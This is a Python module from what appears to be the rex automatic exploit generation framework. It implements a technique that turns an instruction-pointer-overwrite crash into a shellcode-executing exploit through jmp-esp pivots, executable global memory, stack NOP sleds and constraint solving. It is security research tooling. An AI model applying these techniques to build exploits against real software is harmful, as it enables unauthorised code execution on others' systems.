import logging
from rex import Vulnerability
from rex.exploit import Exploit, CannotExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.call_shellcode")

class CallShellcode(Technique):

    name = "call_shellcode"

    applicable_to = ['unix']

    def apply(self, **kwargs):
        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            raise CannotExploit("[%s] cannot control ip" % self.name)

        if not self.crash.project.loader.main_object.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)

        # try to write shellcode into global memory
        shellcode = self.shellcode.get_default(**kwargs)

        # try to use a jmp esp
        # 1) find all pivots
        # 2) try each of the pivots with the constraint that the data below the stack is our shellcode
        # 3) done
        if not self.crash.project.loader.main_object.pic and not self.crash.state.regs.sp.symbolic:
            l.debug("try: jmp esp")
            ld = self.crash.project.loader
            pivots = [x + ld.main_object.mapped_base for x in ld.main_object.memory.find(b'\xff\xe4')]
            pivots += [x + ld.main_object.mapped_base for x in ld.main_object.memory.find(b'\xff\xd4')]
            code_constraint = self.crash.state.memory.load(self.crash.state.regs.sp, len(shellcode)) == shellcode

            for pivot in pivots:
                exp = self._attempt_jump([code_constraint], pivot)
                if exp is not None:
                    return exp

        # try to write to some known memory address
        # 1) find a w+x region we can write to
        # 2) see if we can constrain its value to shellcode and the ip to that address
        # 3) done
        l.debug('try: shellcode in global data')
        shc_addr, shc_constraint = self._write_global_data(shellcode)
        if shc_addr is not None:
            exp = self._attempt_jump([shc_constraint], shc_addr)
            if exp is not None:
                return exp

        # try to see if we can jump directly to the stack
        # 1) check that aslr is disabled
        # 2) find all the regions on the stack that are touched by stdin
        # 3) find the largest of those regions that are not concretely constrained
        # 4) check that we can jump to the middle of a nopsled in one of them
        # 5) done
        if not self.crash.aslr:
            l.debug('try: absolute address in stack')
            base_stack_addrs = self.crash.stack_control()
            stack_addrs = {}
            for addr, size in base_stack_addrs.items():
                root = None
                for subaddr in range(addr, addr+size):
                    val = self.crash.state.memory.load(subaddr, 1)
                    # TODO: This sucks. do a real approximation with something like dvsa.
                    if any('aeg_stdin' in name for name in val.variables) and not \
                            any(c.op == '__eq__' for c in self.crash.state.solver.constraints if not val.variables - c.variables):
                        if root is not None:
                            stack_addrs[root] += 1
                        else:
                            root = subaddr
                            stack_addrs[root] = 1
                    else:
                        root = None

            for root in sorted(stack_addrs, key=lambda a: -stack_addrs[a]):
                if stack_addrs[root] < len(shellcode):
                    continue

                # TODO: you can do better than this...
                sc_data = self.crash.state.memory.load(root, len(shellcode))
                sc_constraint = sc_data == shellcode
                if self.crash.state.solver.satisfiable(extra_constraints=(sc_constraint,)):
                    attempt = 8
                    last_good = 0
                    while attempt + len(shellcode) <= stack_addrs[root]:
                        sc_data = self.crash.state.memory.load(root, len(shellcode) + attempt)
                        sc_constraint = sc_data == b'\x90'*attempt + shellcode
                        if not self.crash.state.solver.satisfiable(extra_constraints=(sc_constraint,)):
                            break
                        last_good = attempt
                        attempt = int(attempt * 1.5)

                    # try the addresses in a spiral pattern
                    addrs = list(range(last_good + 1))
                    cur = len(addrs) // 2
                    for i in range(len(addrs)):
                        if i % 2 == 0:
                            cur += i
                        else:
                            cur -= i
                        addr = addrs[cur]
                        exp = self._attempt_jump([sc_constraint], addr, bypasses_aslr=False)
                        if exp is not None:
                            return exp

        # try to read shellcode into memory into one of the aforementioned addresses
        l.debug("try: read shellcode into global data")
        try:
            shc_addr, shc_constraint = self._read_in_global_data(shellcode)
        except CannotExploit as e:
            raise CannotExploit("[%s] cannot call read (all other call-shellcodes failed)" % self.name) from e

        exp = self._attempt_jump([shc_constraint], shc_addr)
        if exp is not None:
            return exp

        raise CannotExploit("[%s] EVERYTHING FAILED")

    def _attempt_jump(self, constraints, addr, bypasses_nx=False, bypasses_aslr=True):
        all_constraints = list(constraints) + [self.crash.state.regs.ip == addr]

        if self.crash.state.solver.satisfiable(extra_constraints=all_constraints):
            self.crash.state.solver.add(*all_constraints)
            return Exploit(self.crash, bypasses_aslr=bypasses_aslr, bypasses_nx=bypasses_nx)

        return None
